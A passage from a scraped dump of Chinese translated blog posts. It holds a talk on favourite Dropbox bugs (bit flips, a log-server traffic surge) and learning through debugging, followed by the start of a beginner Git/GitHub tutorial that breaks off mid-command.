bug，然后说服你也应该热爱 bug。,\n,\n,第一个 Bug,\n,好，直接进入 第一个 Bug。这是我在 Dropbox 遇到的一个 bug 。你可能知道，Dropbox 是个应用程序，可以将文件从一台计算机同步到云端，并同步到其它计算机。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n        +--------------+     +---------------+\r\n        |              |     |               |\r\n        |  METASERVER  |     |  BLOCKSERVER  |\r\n        |              |     |               |\r\n        +-+--+---------+     +---------+-----+\r\n          ^  |                         ^\r\n          |  |                         |\r\n          |  |     +----------+        |\r\n          |  +---> |          |        |\r\n          |        |  CLIENT  +--------+\r\n          +--------+          |\r\n                   +----------+,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,        ,+,--,--,--,--,--,--,--,+,     ,+,--,--,--,--,--,--,--,-,+,        ,|,              ,|,     ,|,               ,|,        ,|,  ,METASERVER,  ,|,     ,|,  ,BLOCKSERVER,  ,|,        ,|,              ,|,     ,|,               ,|,        ,+,-,+,--,+,--,--,--,--,-,+,     ,+,--,--,--,--,-,+,--,--,-,+,          ,^,  ,|,                         ,^,          ,|,  ,|,                         ,|,          ,|,  ,|,     ,+,--,--,--,--,--,+,        ,|,          ,|,  ,+,--,->, ,|,          ,|,        ,|,          ,|,        ,|,  ,CLIENT,  ,+,--,--,--,--,+,          ,+,--,--,--,--,+,          ,|,                   ,+,--,--,--,--,--,+,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这是一个简化的 Dropbox 架构图。桌面客户端在本地监控文件系统的变化。当它找到一个改变的文件，将阅读文件并对 4MB 块中的内容进行哈希处理。这些块存储在一个巨大的键值对存储后端，我们称之为 blockserver。键是经哈希处理的内容的摘要，值是内容本身。,\n,当然，我们要避免多次上传同一个块。想象一下，你正在写一个文档，很可能只是更改了结尾–我们不希望一次又一次的上传开头部分。因此，在将块上传到 blockserver 之前，客户端与另一个管理 metadata 和权限的服务器通信，客户端询问 meta 服务器是否需要这个块或者是否见过这个块。meta 服务器对每个块是否需要上传进行响应。,\n,所以，请求和响应看起来是这样的：客户端：’我有一个由哈希块 ,'abcd,deef,efgh',组成的更改文件。服务器响应”我有前面两个，上传第三个”。然后客户端将第三个上传到 blockserver。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n                +--------------+     +---------------+\r\n                |              |     |               |\r\n                |  METASERVER  |     |  BLOCKSERVER  |\r\n                |              |     |               |\r\n                +-+--+---------+     +---------+-----+\r\n                  ^  |                         ^\r\n                  |  | 'ok, ok, need'          |\r\n'abcd,deef,efgh'  |  |     +----------+        | efgh: [contents]\r\n                  |  +---> |          |        |\r\n                  |        |  CLIENT  +--------+\r\n                  +--------+          |\r\n                           +----------+,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,                ,+,--,--,--,--,--,--,--,+,     ,+,--,--,--,--,--,--,--,-,+,                ,|,              ,|,     ,|,               ,|,                ,|,  ,METASERVER,  ,|,     ,|,  ,BLOCKSERVER,  ,|,                ,|,              ,|,     ,|,               ,|,                ,+,-,+,--,+,--,--,--,--,-,+,     ,+,--,--,--,--,-,+,--,--,-,+,                  ,^,  ,|,                         ,^,                  ,|,  ,|, ,'ok, ok, need',          ,|,'abcd,deef,efgh',  ,|,  ,|,     ,+,--,--,--,--,--,+,        ,|, ,efgh,:, ,[,contents,],                  ,|,  ,+,--,->, ,|,          ,|,        ,|,                  ,|,        ,|,  ,CLIENT,  ,+,--,--,--,--,+,                  ,+,--,--,--,--,+,          ,|,                           ,+,--,--,--,--,--,+,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面是设想，下面的则是 bug 。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n                +--------------+\r\n                |              |\r\n                |  METASERVER  |\r\n                |              |\r\n                +-+--+---------+\r\n                  ^  |\r\n                  |  |   '???'\r\n'abcdldeef,efgh'  |  |     +----------+\r\n     ^            |  +---> |          |\r\n     ^            |        |  CLIENT  +\r\n                  +--------+          |\r\n                           +----------+,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,                ,+,--,--,--,--,--,--,--,+,                ,|,              ,|,                ,|,  ,METASERVER,  ,|,                ,|,              ,|,                ,+,-,+,--,+,--,--,--,--,-,+,                  ,^,  ,|,                  ,|,  ,|,   ,'???','abcdldeef,efgh',  ,|,  ,|,     ,+,--,--,--,--,--,+,     ,^,            ,|,  ,+,--,->, ,|,          ,|,     ,^,            ,|,        ,|,  ,CLIENT,  ,+,                  ,+,--,--,--,--,+,          ,|,                           ,+,--,--,--,--,--,+,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,有时，客户端会发出一个奇怪的请求：每个哈希值应该是16个字符长，但是请求的长度是33个字符，比期望长度的两倍还多 1 。服务器不知道该怎么处理这个异常，会抛出一个异常。我们看到这个异常报告，并查看客户端的日志文件，真是奇怪的现象—客户端本地数据库损坏了，或者 python 将抛出 MemoryErrors ，所有这些都没有道理。,\n,如果你从没有见过这个问题，那么这完全是个谜。但是一旦见过一次，之后的每一次都会认出它。这里有个提示：我们经常看到的 33 个字符长的字符串的中间的字符不是逗号而是,l,。下面是我们在中间位置看到的其他字符：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nl \\x0c < $ ( . -,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,l, ,\\,x0c, ,<, ,$, ,(, ,., ,-,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,逗号的 ascii 码是 44 ，,l,的 ascii 码是 108，在二进制中，它们是这表示的：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nbin(ord(',')): 0101100  \r\nbin(ord('l')): 1101100,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,bin,(,ord,(,',',),),:, ,0101100,  ,bin,(,ord,(,'l',),),:, ,1101100,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你将发现,l,与逗号仅仅相差 1 位。而这就是问题所在：一个位翻转 (bitflip）。客户端使用的内存有一个 bit 损坏了，现在客户端正在向服务器发送垃圾请求。,\n,下面是出现位翻转时我们经常看到代替逗号的其他字符：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n,    : 0101100\r\nl    : 1101100\r\n\\x0c : 0001100\r\n<    : 0111100\r\n$    : 0100100\r\n(    : 0101000\r\n.    : 0101110\r\n-    : 0101101,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,,,    ,:, ,0101100,l,    ,:, ,1101100,\\,x0c, ,:, ,0001100,<,    ,:, ,0111100,$,    ,:, ,0100100,(,    ,:, ,0101000,.,    ,:, ,0101110,-,    ,:, ,0101101,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,位翻转是真实存在的！,\n,我热爱这个 bug 是因为它证明了位翻转是真实存在的，而不只是理论概念。实际上，这种情况在一些领域中比其他领域更常见。 从低端或老硬件的用户获得请求是其中一个，这是很多运行 Dropbox 的笔记本电脑的真实情况。 另外一个有很多位翻转的领域是外层空间——太空没有大气层来保护内存免受高能粒子和辐射的影响，所以位翻转很常见。,\n,在太空中，你可能真的非常关心数据的正确性。比如，你的代码可能用于让国际空间站中的宇航员生存下去，即使不是这样的关键任务，在太空中进行软件更新是很难的。如果真的需要应用程序不存在位翻转 ，可以采取多种硬件和软件方法。对于这个问题，Katie Betchold 有一个,非常有趣的演讲,。,\n,Dropbox 不需要处理位翻转 。损坏内存的电脑是用户的，我们可以检测到逗号是否发生了位翻转，但如果它是不同的字符，我们不一定会知道，如果位翻转发生在磁盘读取的实际文件中，我们就不知道了。我们可以发现这个问题的空间太有限了，因此我们决定不对异常进行处理并继续。这类 bug 通常可以通过客户端重启电脑解决。,\n,不容易发生的 bug 并不是不可能的,\n,这是它成为我最喜欢的 bug 的原因之一。 它可以提醒我们 unlikely 和 impossible 的区别。 在足够的规模下， unlikely 事件以明显的速率发生。,\n,通用 bug,\n,我最喜欢这个错误的第二个原因在于通用。 这个 bug 可能发生在桌面客户端与 server 通信的任何位置，系统中有很多不同的端点和组件。这意味着 Dropbox 的许多工程师将会看到这个 bug 的不同版本。当你第一次看到它时，真的非常伤脑筋，但是之后很容易诊断，而且检查非常快：只需要看看中间的字符是不是,l,。,\n,文化差异,\n,这个 bug 的一个有趣的副作用是它暴露了服务器团队和客户端团队的文化差异。 有时候服务器小组的成员会发现这个 bug 并进行调查。 如果一台服务器正在翻转位，这可能不是偶然的现象 – 很可能是内存损坏，你需要找到受影响的机器并尽快将其从服务器池中移出，否则可能会损坏大量的用户数据。 这是一个事件，你需要快速回应。 但是，如果用户的机器正在损坏数据，那么可以做的事情就不多了。,\n,分享你的 Bug,\n,所以，如果你正在研究一个令人困惑的 bug ，特别是大系统中的一个 bug ，不要忘了与别人交流。 也许你的同事之前看到过一个这样 bug 。 如果他们看到过，可以节省很多时间。 如果他们不知道，记得告诉别人解决问题的方法 – 写下来或在团队会议上讲出来。 下一次你们的队伍有类似的事情发生时，你们会更有准备。,\n,Bug 如何帮助我们学习,\n,Recurse Center,\n,加入 Dropbox 之前，我在 Recurse Center (RC) 工作。RC 是一个社区，它的的理念是帮助具备自我导向的学习者通过协作共同成长为更好的程序员。这是 RC 的全部：这里没有任何课程、作业或者截止日期。唯一的课题是分享变为更好的程序员的目标。我们看到很多获得 CS 学位但是对实际编程没有把握的人参加这个项目，或者写了十年 Java 又想学习 Clojure 或者 Haskell 的人参加这个项目，当然还有很多其他的参与者。,\n,我的工作是推进者，工作职责是帮助用户填补缺乏的结构和根据从以前的参与者身上学到的东西提供指导。 所以我和我的同事对于帮助自我激励的成年人学习最好的技术非常感兴趣。,\n,刻意练习,\n,这个领域有很多不同的研究，我认为最有趣的一项研究是刻意练习的思想。刻意练习试图解释专家与业余爱好者的差别。这里的指导原则是，如果你只关注与生俱来的特征-遗传或其他-它们不会对解释差异做出太大贡献。因此研究人员（开始是 Ericsson , Krampe 和 Tesch-Romer ）开始研究是什么造成了这些差异。他们的结论是花费在刻意练习上的时间。,\n,刻意练习定义的范围非常狭窄：不是为了报酬，也不是为了玩乐。我们必须在自己能力的边缘进行练习，做一个适合自己水平的项目（不会容易的学不到任何东西，也不会困难到毫无进展）。还必须获得做法是否有效的及时反馈。,\n,这非常令人兴奋，因为这是如何构建专业知识的框架。但是挑战在于，对于程序员来讲，这个建议难以实现。程序员很难知道自己是否在能力边缘工作，及时反馈也非常罕见（在某些情况下可能会立即得到反馈，而在其他情况下可能需要几个月的时间才会有反馈）。你可以在 REPL 等一些小事上得到快速反馈，但是如何进行设计决策或者选择技术，很可能很长时间都无法得到反馈。,\n,但是刻意练习对于调试代码非常有用。如果编写代码，编代码时会有代码如何工作的心智模式。如果代码有一个 bug ，那么心智模式并不完全正确。根据刻意练习的定义，你处在理解的边缘，太棒了，你即将学习新的东西。如果你能够重现 bug ，那么可以立即获得修复是否正确的反馈（这种情况非常罕见）。,\n,这种类型的 bug 可能会使你了解一些关于自己程序的信息，也有可能学到代码所运行的系统的更多内容。我这里有一个这样的 bug 的故事。,\n,第二个 Bug,\n,这个 bug 也是在 Dropbox 工作时遇到的。那时，我正在研究为什么有些桌面客户端不按时发送日志 。我深入研究了客户端日志系统并发现一些有意思的 bug 。我们这里谈到的只是其中与这个故事有关一部分 。,\n,下面是系统架构简图。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n                                   +--------------+\r\n                                   |              |\r\n               +---+  +----------> |  LOG SERVER  |\r\n               |log|  |            |              |\r\n               +---+  |            +------+-------+\r\n                      |                   |\r\n                +-----+----+              |  200 ok\r\n                |          |              |\r\n                |  CLIENT  |  <-----------+\r\n                |          |\r\n                +-----+----+\r\n                      ^\r\n                      +--------+--------+--------+\r\n                      |        ^        ^        |\r\n                   +--+--+  +--+--+  +--+--+  +--+--+\r\n                   | log |  | log |  | log |  | log |\r\n                   |     |  |     |  |     |  |     |\r\n                   |     |  |     |  |     |  |     |\r\n                   +-----+  +-----+  +-----+  +-----+,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,                                   ,+,--,--,--,--,--,--,--,+,                                   ,|,              ,|,               ,+,--,-,+,  ,+,--,--,--,--,--,>, ,|,  ,LOG ,SERVER,  ,|,               ,|,log,|,  ,|,            ,|,              ,|,               ,+,--,-,+,  ,|,            ,+,--,--,--,+,--,--,--,-,+,                      ,|,                   ,|,                ,+,--,--,-,+,--,--,+,              ,|,  ,200, ,ok,                ,|,          ,|,              ,|,                ,|,  ,CLIENT,  ,|,  ,<,--,--,--,--,--,-,+,                ,|,          ,|,                ,+,--,--,-,+,--,--,+,                      ,^,                      ,+,--,--,--,--,+,--,--,--,--,+,--,--,--,--,+,                      ,|,        ,^,        ,^,        ,|,                   ,+,--,+,--,+,  ,+,--,+,--,+,  ,+,--,+,--,+,  ,+,--,+,--,+,                   ,|, ,log, ,|,  ,|, ,log, ,|,  ,|, ,log, ,|,  ,|, ,log, ,|,                   ,|,     ,|,  ,|,     ,|,  ,|,     ,|,  ,|,     ,|,                   ,|,     ,|,  ,|,     ,|,  ,|,     ,|,  ,|,     ,|,                   ,+,--,--,-,+,  ,+,--,--,-,+,  ,+,--,--,-,+,  ,+,--,--,-,+,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,桌面客户端将生成日志 。这些日志被压缩、加密并写入磁盘，然后客户端定期将它们发送到服务器。客户端将从磁盘读取日志并将它们发送到日志服务器。日志服务器将解密并存储，然后返回 200 响应。,\n,如果客户端无法连接日志服务器，它不会让日志目录无限增大。当日志目录达到一定大小时，客户端将删除日志从而保证日志目录的大小在最大范围之内。,\n,最初的两个 bug 是些小问题。第一个是桌面客户端向服务器发送日志时从最旧的开始（而不是从最新的开始）。这不是我们想要的，比如，如果客户端报告了一个异常，服务器将要求客户端发送日志文件，这时你可能关心刚刚发生的情况的日志，而不是磁盘上最旧的日志。,\n,第二个 bug 与第一个类似：如果日志目录达到设置的最大值，客户端将从最新的日志开始删除（而不是删除最旧的日志）。这时，哪种方法都会删除日志，只是我们更关心比较新的日志。,\n,第三个 bug 与加密有关。有时，服务器无法解密日志文件（我们通常无法找到原因-可能是字节反转）。后端无法正确处理这个错误，因此服务器会返回 500 响应。客户端在接收到 500 响应时的表现相当合理：它将假设服务器已关闭。因此，它会停止发送日志文件，不再尝试发送其它文件。,\n,对损坏的日志文件返回 500 响应显然是错误的行为。我们可以考虑返回 400 响应，因为这是客户端的问题。但是客户端也无法解决这个问题-如果日志文件现在无法解密，将来也无法解密。因此，我们真正想让客户端做的只是删除日志文件并继续工作。实际上，客户端从服务器获取 200 响应时默认日志文件存储成功。所以，如果日志文件无法解密，返回 200 响应就可以了。,\n,所有这些 bug 都很容易修复。前两个错误发生在客户端，所以我们在 alpha 版本进行修复，但是还没有发布给大多数客户。我们在服务器上修复第三个错误并部署。,\n,突然之间，日志集群流量激增。服务团队询问我们是否知道发生了什么事情。我花了一分钟的时间把所有情况放在一起。,\n,在这些问题修复之前，四件事情正在发生：,\n,\n,日志文件从最老版本开始发送,\n,日志文件从最新版本开始删除,\n,如果服务器无法解密日志文件，它将返回 500 响应,\n,如果客户端接收到 500 响应，它将停止发送日志,\n,\n,客户端可能会尝试发送损坏的日志文件，服务器返回 500 响应，客户端放弃发送日志。下一次运行时，它会尝试再次发送相同的文件，再次失败并再次放弃。最终日志目录会变满，客户端将开始删除最新日志文件，并将损坏的日志文件保留在磁盘上。,\n,这三个 bug 的结果是：如果客户端曾经有一个损坏的日志文件，我们将再也看不到来自该客户端的日志文件。,\n,问题在于，处于这种状态的客户端比我们想象的要多得多。 任何具有单个损坏文件的客户端都无法将日志文件发送到服务器。 现在这个问题被解决了，他们都在发送日志目录中的其余内容。,\n,我们的选择,\n,世界各地的机器会造成很大的流量，我们可以做什么呢？（在与 Dropbox 规模相当的公司工作是件有趣的事情，特别是 Dropbox 的桌面客户端规模：你可以轻易地触发自我 DDOS ）。,\n,进行部署时，发现问题的第一个选择是回滚。这是完全合理的选择，但是在这种情况下没有任何帮助。我们要转换的不是服务器上的状态，而是客户端上的状态–我们已经删除了这些文件。回滚服务器将防止其它客户端进入这个状态，但是不能解决问题。,\n,增加日志集群的规模可行吗？我们这样做了，并开始接收到更多的请求，现在我们已经进行了扩容。我们又进行了一次扩容，但是不能总这样。为什么不能？这些集群不是隔离的，它将请求另外一个集群(这里是为了处理异常)。如果遇到指向一个集群的 DDOS ，并且持续扩大集群规模，那么需要解决它们的依赖关系，这样就变成两个问题了。,\n,我们考虑的另一个选择是减轻负担-你不需要每个日志文件，所以我们可以放弃请求。这里的一个挑战在于很难确定哪个需要哪个不需要，我们无法快速区分新日志和旧日志。,\n,我们确定的解决方案是 Dropbox 在许多不同场合使用的解决方案：我们有一个自定义标头,chillout,，所有的客户端都可以接收这个标头。如果客户端接收到包含这个标头的响应，那么它在设定时间内不发送任何请求。有人非常明智的在很早的时候将它添加到 Dropbox 客户端中，多年来它不止一次派上用场。日志记录服务器无法设置这个标头，但这是一个容易解决的问题。我们的两个同事（ Isaac Goldberg 和 John Lai ）提供了支持。我们首先将日志集群的 chillout 设置为两分钟，高峰过去几天之后再将其关闭。,\n,了解你的系统,\n,这个 bug 的第一个教训是了解你的系统。我头脑中有一个很好的客户端和服务器进行交互的模型。但是，我并没有想到服务器同时与所有客户端交互时会发生什么？这是我从来没有想到过的复杂程度。,\n,了解你的工具,\n,第二个教训是了解你的工具。如果事情发生了，你可以采取什么措施？你可以反转迁移吗？如果事情发生了，你如何了解它，如何找到更多信息？最好在危机发生之前了解这些内容，如果你没有这样做，你将在危机发生过程中学到，然后永远不会忘记。,\n,功能标志位 & 服务端门控,\n,如果写移动或客户端应用，这是第三个教训：需要服务端特性门控和服务端标志位。当你发现一个问题并且无法控制服务端，发布一个新的版本或者向应用商店提交一个新版本可能需要几天甚至几周的时间。那是一种很不好的方法。Dropbox 客户端不需要处理应用商店审查流程，但是向几千万客户端推送也需要时间。我们也可以这样解决，出现问题时翻转服务器上的开关然后十分钟解决问题。,\n,但是，这个策略也有开销。添加很多标志位会增加代码的复杂度。在测试中会遇到组合问题：如何同时启用了功能 A 和功能 B，或者只有一个，或者一个都不启动 —如果具有 N 个特性则会非常复杂。完成之后请工程师清理功能标志位也将会非常困难（我也犯了这个错误）。对于桌面客户端来讲，可能同时会有很多版本，这将很难处理。,\n,但是好处在于—当你需要它们时，你真的非常需要它。,\n,如何热爱 bugs,\n,我谈到了我喜欢的一些 bug，并且谈到了为什么热爱这些 bug 。 现在我想告诉你如何去热爱 bug 。 如果你还不喜欢 bug，我知道一种学习方式–具有成长思维模式。,\n,社会学家 Carol Dweck 在人们如何看待能力方面做过很多有趣的研究。她发现人们使用两种不同的框架认识能力。第一个，她称之为固定思维模式，认为能力是一成不变的，人们无法改变自己的能力。另一个思维模式为成长思维模式，在成长思维模式下，人们认为能力是可塑的，不断的努力可以让能力变得更强。,\n,Dweck 发现一个人的能力框架-他们持有固定思维模式还是成长思维模式-会非常明显的影响他们选择任务的方式、他们应对挑战的方式、他们的认知表现、甚至他们的诚实。,\n,我在 Kiwi PyCon 主题演讲中也谈到了成长思维，下面这些只是部分摘录，你可以阅读完整版本,这里,\n,关于诚实：,\n,之后，他们让学生把这项研究的结果写信告诉笔友：“我们在学校做了这项研究，这是我得到的分数。” 他们发现近一半因为聪明被称赞的学生篡改了分数，因为努力工作而受称赞的学生则基本没有不诚实的。,\n,关于努力：,\n,几项研究发现，有固定思维模式的人可能不愿意付出努力，因为他们认为需要努力意味着他们不擅长正在从事的事情。Dweck 指出：“ 如果每次任务都需要努力，那么很难保持对自己能力的信心，你的能力将会受到质疑。”,\n,对混乱的反应：,\n,他们发现，不管资料里是否含有混乱的段落，成长思维的学生大约能够掌握资料的 70% 。固定思维的学生中，如果阅读不包括混乱段落的书，他们也可以掌握资料的 70%。但是当固定思维的学生遇到混乱的段落，他们的掌握率下降到 30% 。固定思维的学生在从混乱恢复过来的过程中会遇到很大的困难。,\n,这些发现表明，debug 过程中成长思维非常关键。我们需要从混乱过程中恢复过来，对我们理解的局限性保持坦诚，有时找到解决方案的道路真的非常曲折—所有这些，具有成长思维的人更容易处理，遇到痛苦也会少一些。,\n,热爱你的 bug,\n,通过在 Recurse Center 工作时的庆祝挑战，我学会了热爱 bug 。一位参与者会坐到我旁边说：“[叹气] 我想我遇到了一个奇怪的 Python 错误”，我说：“太棒了，我热爱奇怪的 Python 错误！”首先，这是绝对正确的，但是更重要的是，这强调参与者找出一些他们努力取得成就的东西，完成它对于他们来说是件好事。,\n,正如我提到的， Recurse Center 没有截止期限和重要节点，这种环境非常自由。我会说：“你可以花一整天的时间去查找 Flask 中这个奇怪的 bug ，多么刺激！” 在 Dropbox 和 Pilot，我们要发布产品、有截止日期、有用户，我并不总能花一天的时间解决一个奇怪的 bug 。因此，我对具有截止日期的现实世界深表同情。但是，如果我有一个需要修复的 bug ，我必须修复它，抱怨这个错误并不会帮助我更快地修复它。 我认为，即使在最终期限的即将到来的时候，你仍然可以持这种态度。,\n,如果你热爱 bug ，在解决棘手问题时可能会获得更多的乐趣。你可能不那么担心并更加专注。最终会从中学到更多。最后，你可以与朋友和同事分享 bug ，这可以帮助你和你的队友。,\n,谢谢,\n,感谢那些对这次演讲给我反馈以及帮助我来到这里的朋友：,\n,\n,Sasha Laundy,\n,Amy Hanlon,\n,Julia Evans,\n,Julian Cooper,\n,Raphael Passini Diniz 和 Python Brasil 团队的其他成员,\n,\n\r\n        \r\n            ,\n        ,打赏支持我翻译更多好文章，谢谢！,\n        , 打赏译者,\n    ,\n\n    ,\n        ,打赏支持我翻译更多好文章，谢谢！,\n                ,任选一种支付方式,\n                ,\n                        ,\n            \n                            ,\n                    ,\n    ,\n\n    \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,学以致用123,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            应用软件开发，主要用python、sql        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 21,        ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114165/", "url_object_id": "8537a3c72782bba2e6eee3e4d7202046", "front_image_path": "full/5ca0d1af72e4f04453c0e91f066d17bc56b03d52.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/02/2027c50856ddfe647e45b4ac2e86c9f1.jpg"], "title": "手把手指导您使用 Git", "create_time": "2018/06/08", "vote": "1", "bookmark": "5", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Kedar Vijay Kulkarni,   译文出处：,Linux中国/ChenYi,   ,如果您从未使用过 ,Git,，甚至可能从未听说过它。莫慌张，只需要一步步地跟着这篇入门教程，很快您就会在 ,GitHub, 上拥有一个全新的 Git 仓库。,\n,在开始之前，让我们先理清一个常见的误解：Git 并不是 GitHub。Git 是一套版本控制系统（或者说是一款软件），能够协助您跟踪计算机程序和文件在任何时间的更改。它同样允许您在程序、代码和文件操作上与同事协作。GitHub 以及类似服务（包括 GitLab 和 BitBucket）都属于部署了 Git 程序的网站，能够托管您的代码。,\n,步骤 1：申请一个 GitHub 账户,\n,在 ,GitHub.com, 网站上（免费）创建一个账户是最简单的方式。,\n,\n,选择一个用户名（比如说，octocat123），输入您的邮箱地址和密码，然后点击 ,Sign up for GitHub,。进入之后，您将看到下方插图的界面：,\n,\n,步骤 2：创建一个新的仓库,\n,一个仓库（ repository），类似于能储存物品的场所或是容器；在这里，我们创建仓库存储代码。在 ,+, 符号（在插图的右上角，我已经选中它了） 的下拉菜单中选择 ,New Repository,。,\n,\n,给您的仓库命名（比如说，Demo）然后点击 ,Create Repository,。无需考虑本页面的其他选项。,\n,恭喜！您已经在 GitHub.com 中建立了您的第一个仓库。,\n,步骤 3: 创建文件,\n,当仓库创建完毕后，界面将和下方一致：,\n,\n,不必惊慌，它比看上去简单。跟紧步骤。忽略其他内容，注意截图上的 “…or create a new repository on the command line,”。,\n,在您的计算机中打开终端。,\n,\n,键入 ,git, 然后回车。如果命令行显示 ,bash: git: command not found,，在您的操作系统或发行版 ,安装 Git, 命令。键入 ,git, 并回车检查是否成功安装；如果安装成功，您将看见大量关于使用该命令的说明信息。,\n,在终端内输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmkdir Demo\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,mkdir ,Demo, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这个命令将会创建一个名为 Demo 的目录（文件夹）。,\n,如下命令将会切换终端目录，跳转到 Demo 目录：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ncd Demo\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,cd ,Demo, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然后输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\necho \"#Demo\" >> README.md\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,echo, ,\"#Demo\", ,>>, ,README,.,md, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,创建一个名为 ,README.md, 的文件，并写入 ,#Demo,。检查文件是否创建成功，请输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ncat README.md\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,cat ,README,.,md, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这将会为您显示 ,README.md, 文件的内容，如果文件创建成功，您的终端会有如下显示：,\n,\n,使用 Git 程序告诉您的电脑，Demo 是一个被 Git 管理的目录，请输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit init\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,init, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然后，告诉 Git 程序您关心的文件并且想在此刻起跟踪它的任何改变，请输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit add 